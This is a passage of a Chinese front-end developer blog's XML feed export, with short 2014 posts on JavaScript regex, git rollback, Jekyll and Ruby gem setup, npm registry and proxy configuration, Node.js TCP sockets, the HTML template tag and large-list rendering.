    <content type="text"><![CDATA[&quot;something&quot;.match(/\s*(.*?)\s*/) &gt; [&apos;&apos;, &apos;&apos;] &quot;something&quot;.match(/^\s*(.*?)\s*$/) &gt; [&quot;something&quot;, &quot;something&quot;] 为何前者匹配的结果为空？ 如果你不清楚正则的贪婪模式和非贪婪模式，请先移步这里. 整个匹配分为三步： 第一个 \s*, 贪婪模式把字符全部吞掉，然后回溯，直到第一个字符任然没找到 第二步是 .*? 由于是非贪婪模式匹配了一个字符就结束了，继续第三步 第三步匹配失败，回溯到第二步，那第二步会继续减少吞掉的字符，于是字符数缩减到零。 可能这么说还是不太清晰，先看看这个对比： 关于返回结果不是 null 而是 “”，你可以理解为匹配到了零个 a。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>正则</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git版本回退操作]]></title>
    <url>%2Fblog%2F2014%2F04%2F28%2F2014-04-28-git-roll-back%2F</url>
    <content type="text"><![CDATA[今天 github 上操作遇到了一个很头疼的问题，在某个文件中进行了误操作（有可能是加入了BOM头），diff 没看到差异，但是线上就是不正常显示。修改半天没用，只要回退版本。 通过 git log 可以查看近期 commit 的信息： commit bcdfd65ba3f16a0647e7687f92cca25d51738d2e Author: Barret Lee &lt;barret.china@gmail.com&gt; Date: Mon Apr 28 01:22:27 2014 +0800 now post commit 69eeaa60c5808c143aabce4d52feb104e2e4591b Author: Barret &lt;barret.china@gmail.com&gt; Date: Sat Apr 26 21:03:48 2014 +0800 fix bug commit b9e4b8c697d139ec35e17be7dd353f1338e9b92e Author: Jing Lee &lt;barret.china@gmail.com&gt; Date: Sat Apr 26 19:35:37 2014 +0800 Update atom.xml commit 后面的一串字符就是 SHA 字符。 git reset --hard SHA 这句命令可以回退到指定版本。不过上传的时候要注意了，如果你是： git push -u master origin 肯定会出现这样的错误提示： error: failed to push some refs to &apos;//github.com/barretlee/barretlee.github.io.git&apos; hint: Updates were rejected because the tip of your current branch is behind hint: its remote counterpart. Integrate the remote changes (e.g. hint: &apos;git pull ...&apos;) before pushing again. hint: See the &apos;Note about fast-forwards&apos; in &apos;git push --help&apos; for details. 原因是你本地版本要落后于服务器上的版本（git reset 回退了嘛），如果想覆盖服务器上版本，应该加 -f ，强制提交， git push -u master origin -f 不过这样的操作要谨慎了，先把修改的位置备份（拿出来，复制到文件夹外），完成上述操作之后再复制回来处理。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>CMS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jekyll安装不了？]]></title>
    <url>%2Fblog%2F2014%2F04%2F27%2F2014-04-27-ruby-jekyll-install%2F</url>
    <content type="text"><![CDATA[1、安装Ruby sudo apt-get install ruby1.9.1-dev 2、安装Jekyll sudo gem install jekyll 3、安装rake(用来可以生成markdown文件) sudo gem install rake 注意几点： 不是安装 ruby，而是 ruby-dev 安装 jekyll 之前应该先安装 rdoc 1sudo gem install rdoc 关于gem的下载速度，查看这篇文章]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>jekyll</tag>
        <tag>ruby</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu下Rhythmbox mp3音乐乱码]]></title>
    <url>%2Fblog%2F2014%2F04%2F27%2F2014-04-27-filename-messy-code%2F</url>
    <content type="text"><![CDATA[linux系统遇到点乱码问题是很正常的，你碰到的问题，别人一般会已经碰到过，甚至已经有了很好的解决方案。 今天遇到的问题是：Rhythmbox mp3音乐乱码 处理方案： sudo vim /etc/profile # 类似 windows 下的环境变量 # 添加 export GST_ID3_TAG_ENCODING=GBK:UTF-8:GB18030 export GST_ID3V2_TAG_ENCODING=GBK:UTF-8:GB18030 重启电脑，没想到不用重启的方法，source ~/.profile 没效果。]]></content>
      <categories>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>messy</tag>
        <tag>乱码</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOS边缘回弹的禁止]]></title>
    <url>%2Fblog%2F2014%2F04%2F27%2F2014-04-27-IOS-doc-scroll%2F</url>
    <content type="text"><![CDATA[IOS的浏览器里头，文档滚到顶部或者底部，还是可以继续滚动，对于全屏的应用来说，这个多余的体验是十分不好的。如下： 比较靠谱的方式是： document.addEventListener(&quot;touchmove&quot;, function(evt){ evt.preventDefault(); }, true); 禁用 touchmove，方法很靠谱，不过还是谨慎点用。呵呵。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>IOS</tag>
        <tag>touchmove</tag>
        <tag>scroll</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gem速度慢]]></title>
    <url>%2Fblog%2F2014%2F04%2F27%2F2014-04-27-gem-sources%2F</url>
    <content type="text"><![CDATA[删除本来的源，添加淘宝的源。 1 查看源 gem sources list 2 删除list中的源 gem sources --remove http://rubygems.org/ 3 查看是否已经删除 重复1,结果为空就正确 4 添加淘宝的源 gem sources -a http://ruby.taobao.org/]]></content>
      <categories>
        <category>杂物间</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>ruby</tag>
        <tag>gem</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[巧妙交换值]]></title>
    <url>%2Fblog%2F2014%2F04%2F26%2F2014-04-26-replace-a-and-b%2F</url>
    <content type="text"><![CDATA[a = 1, b = 2; a = [b, b = a][0]; a // 2 b // 1 很巧妙的替换了 a 和 b 的值。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>hack</tag>
        <tag>tips</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jekyll编译时报错invalid byte sequence in GBK]]></title>
    <url>%2Fblog%2F2014%2F04%2F26%2F2014-04-26-jekyll-error-when-compile%2F</url>
    <content type="text"><![CDATA[找到你的Ruby安装目录，如我的是：D:\Ruby193, 在里面找到文件D:\Ruby193\lib\ruby\gems\1.9.1\gems\jekyll-0.12.0\lib\jekyll\convertible.rb在该文件中找到下面句子： # Returns nothing. def read_yaml(base, name) self.content = File.read(File.join(base, name)) 将它修改为： # Returns nothing. def read_yaml(base, name) self.content = File.read(File.join(base, name),:encoding=&gt;&quot;utf-8&quot;) 然后确保所有带中文字符的markdown文件是无BOM的UTF-8格式即可。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>error</tag>
        <tag>jekyll</tag>
        <tag>ruby</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jekyll中gsub未定义的错误]]></title>
    <url>%2Fblog%2F2014%2F04%2F26%2F2014-04-26-gsup-error-in-atom-file%2F</url>
    <content type="text"><![CDATA[今天被 jekyll 编译时的一个问题搞疯了。 Liquid Exception: undefined method `gsub’ for nil:NilClass in atom.xml 上面这个错误，开始以为时jekyll的版本问题，后来又以为时 UIT8 编码错误，再继续折腾，看了很多博客还是没有处理好。 在 atom.xml 中我写了一句 ，以前一直是这样的啊，没报错。不知道 github pages 的后台 jekyll 编译器是不是做了版本或者其他方面的修改，定位到这个位置之后，把内容改成了 \{\{ post.excerpt }} \{\{ post.content }} # 改成这个也可以，只是内容太多，我不喜欢 差不多整了我两个小时，这么点小错误，妹的！]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>error</tag>
        <tag>jekyll</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[clip的安装和使用]]></title>
    <url>%2Fblog%2F2014%2F04%2F26%2F2014-04-26-clip-in-sys%2F</url>
    <content type="text"><![CDATA[很多情况下我们需要复制整个文件的内容，然后粘贴到其他地方，像我这种命令行控，文件操作基本都是命令行处理的，平时会用 vim 打开文件，然后 vim FILE # 打开文件 ggVG # 全选内容 &quot;+y # 复制到系统缓冲区 说实话，这真的很麻烦，其实我们可以这样： # windows用户 clip &lt; FILE echo &quot;content&quot; | clip # linux用户 xclip -sel clip &lt; FILE 省去了打开文件复制的过程。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tips</tag>
        <tag>clip</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[打印]]></title>
    <url>%2Fblog%2F2014%2F04%2F25%2F2014-04-25-window-print%2F</url>
    <content type="text"><![CDATA[打印的常用的几种方式： 1. open新页面打印var childWin = window.open(&quot;about:blank&quot;); childWin.document.body.innerHTML = document.body.innerHTML; // code... // 操作（修改/隐藏/添加）内容 childWin.print(); 2. iframe中打印var ifr = document.createElement(&quot;iframe&quot;); ifr.src = &quot;about:blank&quot;; ifr.style.display = &quot;none&quot;; document.body.appendChild(ifr); var win = ifr.contentWindow; win.document.body.innerHTML = document.body.innerHTML; // code... // 操作（修改/隐藏/添加）内容 win.print(); 3. 本页打印var oldHTML = document.body.innerHTML; // code... // 操作（修改/隐藏/添加）内容 window.print(); // 完了之后 document.body.innerHTML = oldHTML;]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>print</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出NodeJS——数据通信，NET模块运行机制]]></title>
    <url>%2Fblog%2F2014%2F04%2F22%2F2014-04-22-cb-nodejs-net-module%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 互联网的运作，最根本的驱动就是信息的交互，NodeJS 在数据交互这一块做的很带感，异步编程让人很惬意，关于 NodeJS 的数据通信，最基础的两个模块是 NET 和 HTTP，前者是基于 TCP 的封装，后者本质还是 TCP 层，只不过做了比较多的数据封装，我们视之为更高层。本文先述说 NodeJS 的 NET 模块工作机制，下次再谈一谈 HTTP 模块。本文地址：http://www.cnblogs.com/hustskyking/p/nodejs-net-module.html，转载请注明源地址。一、服务器和客户端之间的交互NodeJS 底层支撑是 v8，v8 是用 C++ 编写的一个编译和运行 JavaScript 代码的库，说到 TCP/UDP，写 C/C++ 的童鞋肯定不会感到陌生，在建立 socket 连接的时候，基本都会涉及到相关的知识。这里先解释下服务器端和客户端之间的一些共性和差异。关于数据交互，我们可以想象成，Server 与 Client 之间建立了一个管道（pipe），这个管道有两个分支，一个是用于发送 S 到 C 的数据，一个是用于发送 C 到 S 的数据。那么这个管道是如何建立的呢？首先，Server 监听本地的某个端口（所谓端口，可以理解成对外交流的摊铺），Client 很明确自己要跟谁去交流，他去访问 Server 的那个摊铺，于是两者之间就可以沟通了。所以 Server 跟 Client 之间的差异是十分明显的，Server 会监听端口，而 Client 去访问端口。Unix/Linux 系统跟 windows 有些不同，他可以去监听端口，也可以去监听文件，也就是说他可以把端口和文件都当做对外交流的摊铺。那么 Client 可以通过访问一个文件与 Server 建立起 pipe。二、Node 如何开启一个 TCP 服务器在电脑上安装好了 Node 之后，我们就可以引用 Node 提供的模块，Node 内置了很多模块，如文件处理（FireSystem）、控制台（Console）、数据流（Stream）等等，这些我会在以后的文章中提到。建立 TCP 连接需要用到的是 Node 的 NET 模块。使用一个模块十分简单： 1var net = require(&apos;net&apos;); net 是一个系统模块，也就是安装 Node 之后自带的模块，没必要对他感到畏惧，其实他的内部也是十分简单的： 123456var Net = function()&#123;&#125;;Net.methodA = function ()&#123;&#125;;Net.methodB = function ()&#123;&#125;;module.exports = Net; 我们可以简单理解 net 模块的内部实现，他就是一个 Net 类，上面绑定了很多的 methods，require 之后，相当于返回一个 Net 类，此时我们就可以尽情使用 Net 中定义的所有方法和属性了。Node 中开启一个 TCP 服务器： 1234567891011121314// server.jsvar net = require(&apos;net&apos;);var server = net.createServer(function(socket) &#123; //&apos;connection&apos; listener console.log(&apos;server connected&apos;); socket.on(&apos;end&apos;, function() &#123; console.log(&apos;server disconnected&apos;); &#125;); socket.on(&apos;data&apos;, function()&#123; socket.end(&apos;hello\r\n&apos;); &#125;);&#125;);server.listen(8124, function() &#123; //&apos;listening&apos; listener console.log(&apos;server bound&apos;);&#125;); 上面这段代码应该很好理解，首先 net.createServer 创建一个 TCP 服务，这个服务绑定（server.listen）在 8124 这个端口上，创建 Server 后我们看到有一个回调函数，这个回调函数的实现方式是怎么样的呢？ 12345net.createServer = function(callback)&#123; // 每次客户端连接都会新建一个 socket var socket = new Socket(); callback &amp;&amp; callback(socket);&#125;; 在调用上面函数的时候传入一个参数，这个参数也是函数，并且接受了 socket ，这个由其他方法构造的一个管道（pipe），他的作用就是用来数据交互的。第一节中我们说到了，pipe 是需要 Client 跟 Server 打招呼才能建立的，如果此刻没有客户端访问 Server，这个 socket 就不会存在了。三、写一个客户端程序与服务器交互既然 Socket ，也就是管道（pipe）还没有存在，那肯定是不会存在通讯的，下面来写一个客户端程序： 12345678910111213// client.jsvar net = require(&quot;net&quot;);var client = net.connect(&#123;port: 8124&#125;, function()&#123; console.log(&apos;client connected&apos;); client.write(&apos;world!\r\n&apos;);&#125;);client.on(&apos;data&apos;, function(data) &#123; console.log(data.toString()); client.end();&#125;);client.on(&apos;end&apos;, function() &#123; console.log(&apos;client disconnected&apos;);&#125;); net.connect 顾名思义，就是连接到服务端，第一个参数是对象，设置端口（port）为 8124，也就是我们服务器监听的端口，由于没有设置 host 参数，那默认就是 localhost （本地）。在 Server 中，socket 是管道的一端，而在 client 中，client 本身就是管道的一端，如果是多个客户端连接 Server，Server 会新建多个 socket，每个 socket 对应一个 client。数据的通信就十分简单了，首先运行服务器程序： 1node server.js 此时便会有一个服务器监听 8124 端口，然后打开一个客户端程序： 1node client.js 那么两者之间的信息交互就开始了。具体他们是怎么交流的呢？四、基于事件的哲学首先我们要说一说 NodeJS 的 EventEmitter 模块。这个模块就是一个事件中心，之前写过相关的内容，可以看看简介版的 EventEmitter，戳我。EventEmitter 也就是如此，可以 on 添加事件到事件池，也可以 trigger 触发事件，当然可以从事件池中删除事件 off。NET 模块是继承 EventEmitter 的，所以他创建的很多对象可以： 1234client.on(&apos;data&apos;, function(data) &#123; console.log(data.toString()); client.end();&#125;); 如上绑定很多自定义的事件，等到交互中需要信息交流的时候再触发。就拿上面这句代码来说，client 绑定了一个 data 事件，这个事件会在 Server 有信息传过来的时候触发，他所做的工作，先打印传过来的数据，然后 end() 关闭这个管道（pipe）。JavaScript 是基于事件的一门语言，几乎所有的动作都是由事件驱动的，这个在异步编程中显得十分突出。五、相关 API 的枚举Server 除了有 listen 函数外，还有很多的接口：Server.close([callback])，停止监听，那么之前的所有管道也就没有用了。Server.maxConnections，Server 的最大连接数，这个连接数是有上限的（跟系统有关），我们也可以自己设定连接数的最大上限（不超过系统最大连接数）。Server.address()，在 listen 之后可以通过这个函数拿到服务器的相关信息。 12345// grab a random port. server.listen(function() &#123; address = server.address(); console.log(&quot;opened server on %j&quot;, address);&#125;); 还有 write、end、destroy、pause、resume 等等很多丰富的接口，可以在这里查看详情http://nodejs.org/api/net.html。 六、小结 本来打算写一个聊天室，但是这种简单的代码网络上俯拾皆是，本文目的是说清楚 TCP 连接在服务器和客户端之间的交互过程，深入的话题留到下次谈。 七、参考资料 http://nodejs.org/api/net.html]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>NodeJS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cloneNode/importNode Bug in Old Chrome]]></title>
    <url>%2Fblog%2F2014%2F04%2F21%2F2014-04-21-clonenode-bug-in-old-chrome%2F</url>
    <content type="text"><![CDATA[support.checkClone = div.cloneNode(true).cloneNode(true).lastChild.checked; 有人问：为什么需要 cloneNode 两次呀？ 这是老版 chrome 内部实现的一个 bug，这个 bug 在四年前就提出来了，cloneNode 和 importNode 没法保存片段代码中表单元素诸如 value/checked 之类的属性。 解决方案是：将 cloneNode 拿到的代码片段在 clone 一次。如同 IE6 下浮动元素 margin 的渲染，是 IE6 的 bug，通过设置 inline 可以解决。 Bug 地址：http://bugs.webkit.org/show_bug.cgi?id=6617 Bug 测试源码：link JQ中对这个 bug 的阐述：http://bugs.jquery.com/ticket/5832 JQ对这个bug 的处理：http://bugs.jquery.com/ticket/5929]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>bug</tag>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[array 不等于 array]]></title>
    <url>%2Fblog%2F2014%2F04%2F20%2F2014-04-20-valueof-and-tostring%2F</url>
    <content type="text"><![CDATA[1[] == ![] // true 其实这个问题没啥好讨论的，ECMA-262看看就知道了。不过很多人问，就做个笔记。 前面那个 [] 在解析的时候调用的是 valueOf 返回的结果是 ‘’后面那个取反运算，对 NAN undefined null “” 0 取反结果才会是true，所以 ![] 的结果是 false 左边是 ‘’ ，右边是 false，答案是什么一目了然了。 具体可以看看：http://barretlee.com/demo/ST/ES5.1/#sec-11.9.3]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[换个标签写前端模板]]></title>
    <url>%2Fblog%2F2014%2F04%2F13%2F2014-04-13-cb-javascript-template-tag%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 前端模板中，我们通常使用 script/textarea 来存放模板代码，然后使用 innerHTML/value 属性来获取模板内容进行解析和拼装。 1234567891011&lt;script type=&quot;text/x-template&quot; id=&quot;tpl&quot;&gt; &lt;h1&gt;&lt;%=data.title%&gt;&lt;/h1&gt; &lt;p&gt;&lt;%=data.content%&gt;&lt;/p&gt;&lt;/script&gt;&lt;script&gt; var htmlTpl = document.getElementById(&quot;tpl&quot;).innerHTML; tplEngine(htmlTpl, &#123; title: &quot;This is title&quot;, content: &quot;This is content&quot; &#125;);&lt;/script&gt; 关于 tplEngine 这个 Javascript 模板引擎，之前也写了篇 文章 介绍过，这里就不赘述了。除了使用 script 标签，textarea 也可以达到同样的效果，但是本文叙述的重点并不是如何去解析一个 JavaScript 模板。W3C工作组在 HTML 中加入了一个新的标签 &mdash;&mdash;TEMPLATE。他提供了一个可以定义 HTML 代码片段的机制，下面就来详细说说这个 TEMPLATE 标签。本文地址：http://www.cnblogs.com/hustskyking/p/javascript-template-tag.html，转载请注明源地址。一、先看 DEMO运行下面的 demo，或许你已经知道了一些东西了。 1234567891011121314151617181920212223242526&lt;ul id=&quot;list&quot;&gt; &lt;!-- TEMPLATE 模板 --&gt; &lt;template id=&quot;tpl&quot;&gt; &lt;li&gt;&lt;span&gt;&lt;/span&gt; - &lt;span&gt;&lt;/span&gt;&lt;/li&gt; &lt;/template&gt;&lt;/ul&gt;&lt;button id=&quot;btn&quot;&gt;见证奇迹的时刻→&lt;/button&gt;&lt;script&gt; var datas = [ &#123;name:&quot;李靖&quot;, age:&quot;21&quot;&#125;, &#123;name:&quot;Barret Lee&quot;, age:&quot;21&quot;&#125; ]; btn.onclick = function()&#123; for(var i = 0, len = datas.length; i &lt; len; i++)&#123; var data = datas[i]; // 获取模板代码 var htmlTpl = tpl.content.cloneNode(true); // 插入数据 var spans = htmlTpl.querySelectorAll(&quot;span&quot;); spans[0].textContent = data.name; spans[1].textContent = data.age; // 插入到 DOM 中 list.appendChild(htmlTpl); &#125; &#125;;&lt;/script&gt; 这里使用的 template 标签，标签的内容没有被解析，我们并没有也使用 innerHTML 这种暴力手段获取模板内容。二、template 标签特性这个标签可以被定义在任何位置：head 中、body中、甚至是一个 frame 中。标签内容不会显示出来Template 标签不被当做 document 的一部分，你可以去试试弹出 document.getElementById(“tpl”).length, 或者看看他其他的属性，得到的结果都是 undefined。标签内容在被应用之前，都是 inactive 状态，也就是说模板中的 img、audio、script 标签都不会执行（加载）三、浏览器对 template 标签的解析每一个 template 元素都会和一个 DocumentFragment 对象关联，当一个 template 元素被创建时，浏览器会运行如下操作：让文档（doc）是模板元素的ownerDocument的相应的模板内容拥有者文档（owerDocument）。创建一个 DocumentFragment 对象，这个对象的拥有者文档（owerDocument）为 doc将模板文档的 content 内容放到上述新创建的 DocumentFragment 中上面的过程我是翻译 w3c 的规范文档，读起来相当晦涩，如果你了解 shadowDOM,那理解起来就轻松了，template 在解析是，其内容被解析成一个 shadowDOM，我们只能使用 content 属性来获取到这个 shadowDOM 的内容。四、兼容性与需要注意的地方很可惜，这玩意儿虽然好用，但 IE 目前还不支持，当然 Chrome 32+ | Firefox 25+ 都提供了支持。1. 克隆节点而不是直接使用从上面的 demo 中，可以发现，获取 template 标签的内容，其方式是： 1document.getElementById(&quot;tpl&quot;).content 但是我并不是直接将 content 赋值给 htmlTpl，而是： 1htmlTpl = tpl.content.cloneNode(true); 为什么要这么做呢？如果你不是用 cloneNode，而是直接将内容 appendChild 到 DOM 树中，documentFragment 内的内容就会被清空，上面我们说了 template 标签内容就是一个 documentFragment 的 shadowDOM，所以应该使用 cloneNode 或者 importNode 方法将内容复制到 DOM 中，这样才能保证这个 shadowDOM 内容不被清空，从而可以复用（你可以把上面 demo 的 cloneNode 函数去掉，看看结果如何）。2. 不支持 template 标签的降级处理其实也没有比较好的降级处理方案，如果你在 template 中放了 script 或者 img 节点，这些内容都会被解析出来，你阻止不了，所以如果你的程序要兼容所有的浏览器，暂时就不要用了。当然，你可以做这样的判断： 1234if (!&quot;content&quot; in document.createElement(&quot;template&quot;))&#123; // code here.. return;&#125; 3. 模板中嵌入模板 在 script 标签中嵌入一个 script 标签，这个几乎是不可能的事情吧，但是 template 可以： 12345678910&lt;template id=&quot;ulList&quot;&gt; &lt;li&gt; &lt;strong&gt;&lt;%=content%&gt;&lt;/%=content%&gt;&lt;/strong&gt; &lt;template&gt; &lt;div&gt; &lt;p&gt;&lt;%=detail%&gt;&lt;/%=detail%&gt;&lt;/p&gt; &lt;/div&gt; &lt;/template&gt; &lt;/li&gt;&lt;/template&gt; 至于插入之后是个什么效果，读者可以自己去浏览器中查看。这种插入方式是有使用场景的，很多时候我们都是给需要应用模板的元素设置一个 id 或者 class ，方便找到他们，而这种直接插入的方式，我们可以利用模板代码直接找到需要应用模板的元素，如： 123var tpl = ulList.getElementsByTagName(&quot;template&quot;)[0]; // 获取模板var toBox = tpl.parentNode; // 直接定位要插入的位置toBox.appendChild(tpl.content.cloneNode(true)); // 插入 五、拓展 web components Web Components 是一些规范，旨在以浏览器原生的方式向外提供组件，它的规范如下: 模板（Templates）可以将不必立即渲染的元素，不必立即执行的脚本放入这里。装饰器（Decorators）Shadow DOM自定义元素（Custom Elements），实现自定义html标签，及属性。拥有同原生组件一样的生命周期Imports, 指定引入的组件文档及类型其实本文提到的内容就是 web components 的冰山一角，感兴趣的童鞋可以去读一读相关的内容。http://www.html5rocks.com/zh/tutorials/webcomponents/imports/ HTML Importshttp://www.w3.org/TR/components-intro/ w3c componentshttp://www.html5rocks.com/zh/search?q=web+components search六、小结本文稀里哗啦说了一大串，主要是简单介绍 web components 中的 template 标签，用以替换模板代码容器 script/textarea，web components 肯定是 web 发展的一个大头，尤其是移动开发上，很有必要深入研究。七、参考资料http://www.whatwg.org/specs/web-apps/current-work/multipage//scripting-1.html#the-template-element W3C//developer.mozilla.org/en-US/docs/Web/HTML/Element/template MDNhttp://www.c-sharpcorner.com/UploadFile/370e35/template-tag-in-html5/ Sunny Kumar]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webview中的点击高亮问题]]></title>
    <url>%2Fblog%2F2014%2F03%2F31%2F2014-03-31-tap-highlight-in-webview%2F</url>
    <content type="text"><![CDATA[这两天在做一个淘金币的小游戏，测试页面的时候还挺正常的，放到webview（嵌入诸如微信、微博等客户端的网页容器）中就出问题了。 给元素绑定了一个 tap 事件，点击元素，该元素周边会出现点东西，IOS 中是个半透明的灰色背景，在 android 中出现红色的边框，不仅影响美感，貌似还会影响性能（这点东西渲染出来需要时间，会阻塞 JS 中控制的元素渲染）。 开始本以为使用 user-select 可以干掉这玩意儿，结果无效，网上寻觅半天之后，找到了问题。 css 中有个属性叫做 -webkit-tap-highlight-color ，顾名思义，就是点击元素的时候会有一个高亮的效果。当然不能把他称之为 bug，这也是浏览器为了让用户知道你点中了某个东西，给他醒目的提示，算是增强体验，但是在一些场景中，这不仅没有增强体验，还会影响体验。 解决方案： .obj {-webkit-tap-highlight-color:rgba(0,0,0,0);} 有些机子可能比较坑爹，rgba 这种方式支持的不是很好，我们可以用 transparent 来给他透明化。 .obj { -webkit-tap-highlight-color: rgba(0,0,0,0); -webkit-tap-highlight-color: transparent; /* For some Androids */ } 小小分享。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>webview</tag>
        <tag>highlight</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[老程序员Vs新程序员]]></title>
    <url>%2Fblog%2F2014%2F03%2F31%2F2014-03-31-old-programmer-vs-newer%2F</url>
    <content type="text"><![CDATA[经验越足、知道的越多编程越慢这就是为何不能让老程序员冲锋在一线开发岗位的原因。因为编程经验越足、知道的越多，他做项目时就会思前顾后。往往一个小功能给菜鸟开发需要一周，老鸟开发可能得两周，结果用户一个需求变更直接干趴老鸟程序员。 当你成为老程序员时是否也要开始重新审视下自己？！]]></content>
      <categories>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>talk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[npm穿墙]]></title>
    <url>%2Fblog%2F2014%2F03%2F31%2F2014-03-31-npm-cross-wall%2F</url>
    <content type="text"><![CDATA[GWF 很给力，很多东西都能墙掉，但是把 npm 也纳入黑名单，不知道 GWFer 是怎么想的。翻墙翻了好多年了，原理其实也挺简单的，proxy 嘛！ » 方法一A) 国内源，http://cnpmjs.org 使用方式，你可以在 cmd 中键入 npm install -g cnpm，然后出去吃个饭，如果还没有安装好，那就换个方式： npm install -g cnpm --registry=http://r.cnpmjs.org registry 参数的作用就是指向需要 download 的仓库。 cnpm 跟国外的 npm 是同步的，只要 npm 有更新，cnpm 就会跟着一起更新。 当然，你也可以简单点搞： npm config set registry=&quot;http://r.cnpmjs.org&quot; 在配置中直接指定源头，下次就没有必要使用 --registry 参数了。配置好了之后，npm 就指向了国内的仓库。 B) 当然，你也可以安装 cnpm，安装好了之后使用 cnpm 来下载文件，其实原理跟上面是一样的，于是你就可以这样了： cnpm install -g package_name » 方法二代理，在配置中设置代理参数： # 全局路径，也就是 npm install -g，这里 -g 的意义 npm config set prefix=&quot;c:\nodejs&quot; # 一般使用 goagent 翻墙，他的默认端口是 8087 npm config set proxy=http://127.0.0.1:8087 # 设置 https 的代理 npm config set https_proxy=http://127.0.0.1:8087 # 这个地方记得设置下，别搞了个代理，结果在国内源下载 npm config set registry=http://registry.npmjs.org 这样配置好了之后，打开你的 goagent ，记得一定要打开，不然 npm 必然报错。上面写了一堆，其实没必要跟着写这么多，一句话就可以搞定： npm config set proxy=http://127.0.0.1:8087 为啥呢，npm -g 没必要自己去配置， registry 默认就是 http://registry.npmjs.org，不配置 https_proxy，也走的通，所以就只剩下上面这条命令了。 » 方法三直接下载到本地。 实在是怕麻烦，就直接把文件 download 下来，然后放到 node_module 之中就行了。如果是全局模块，找到全局 node_module 的位置，然后解压放进去就行了。]]></content>
      <categories>
        <category>网络交互</category>
      </categories>
      <tags>
        <tag>npm</tag>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个所见即所得的博客]]></title>
    <url>%2Fblog%2F2014%2F03%2F30%2F2014-03-30-WYSIWYG%2F</url>
    <content type="text"><![CDATA[最简单的博客就是，你只需要写，其他的啥都不用管。github 就能够做到。 gihub pages 生成的页面和存放在 github 上的文件存在对应关系，我为每篇文章都加了对应的 edit 链接，这个链接被我隐藏掉了，但是只要在 url 后面加上?edit，就可以在文中的页面里找到这个小小的 edit 链接。同时也在首页加了一个 new post 的链接，方便加入新的文章。 我把这个网站作为平时一些感受和想法的聚集平台，操作简单，上手方便，建议跟我一起玩玩，呵呵~ 感兴趣的童鞋可以从右上角点进这个 github 地址，fork 代码后自行研究。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[百万数据如何在前端快速流畅显示？]]></title>
    <url>%2Fblog%2F2014%2F03%2F25%2F2014-03-25-cb-million-data-show-in-front-end%2F</url>
    <content type="text"><![CDATA[如果要在前端呈现大量的数据，一般的策略就是分页。前端要呈现百万数据，这个需求是很少见的，但是展示千条稍微复杂点的数据，这种需求还是比较常见，只要内存够，javascript 肯定是吃得消的，计算几千上万条数据，js 效率根本不在话下，但是 DOM 的渲染浏览器扛不住，CPU 稍微搓点的电脑必然会卡爆。 本文的策略是，显示三屏数据，其他的移除 DOM。 一、 策略下面是我简单勾画的一个草图，我们把一串数据放到一个容器当中，这串数据的高度（Data List）肯定是比 Container 的高度要高很多的，如果我们一次性把数据都显示出来，浏览器需要花费大量的时间来计算每个 data 的位置，并且依次渲染出来，整个过程中 JS 并没有花费太多的时间，开销主要是 DOM 渲染。 123456789101112 /==============&gt; Data List | .... | / +--------------+/+=======|=====data=====|========+| +--------------+ || | data | || +--------------+ |\| | data | | \| +--------------+ | \======&gt; Container+=======|=====data=====|========+ +--------------+ | .... | Created By Barret Lee 为了解决这个问题，我们让数据是显示一部分，这一部分是 Container 可视区域的内容，以及上下各一屏（一屏指的是 Container 高度所能容纳的区域大小）的缓存内容。如果 Container 比较高，也可是只缓存半屏，缓存的原因是，在我们滚动滚动条的时候，js 需要时间来拼凑字符串（或者创建 Node 